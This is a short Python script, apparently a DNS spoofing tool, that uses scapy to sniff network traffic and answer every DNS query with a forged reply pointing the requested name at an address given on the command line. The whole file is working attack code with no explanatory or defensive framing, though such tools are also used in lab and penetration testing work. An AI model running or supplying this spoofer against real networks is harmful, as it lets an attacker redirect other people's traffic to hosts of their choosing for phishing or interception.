import argparse

from scapy.all import DNS, IP, UDP, DNSRR, send, sniff

destiny = None


def on_dns_packet_detected(pkt):
    if not pkt.haslayer(DNS):
        return

    if not pkt[DNS].qr == 0:
        return

    if pkt.haslayer(DNSRR):
        return

    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
    dns = DNS()

    response = ip / udp / dns

    response[DNS].id = pkt[DNS].id
    response[DNS].qr = 1
    response[DNS].qd = pkt[DNS].qd
    response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=destiny)

    send(response)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--destiny', type=str, default='127.0.0.1', help='Default destiny for DNS packets.')
    parser.add_argument('--interface', type=str, default='lo', help='Default interface.')
    args = parser.parse_args()

    destiny = args.destiny

    sniff(prn=on_dns_packet_detected)
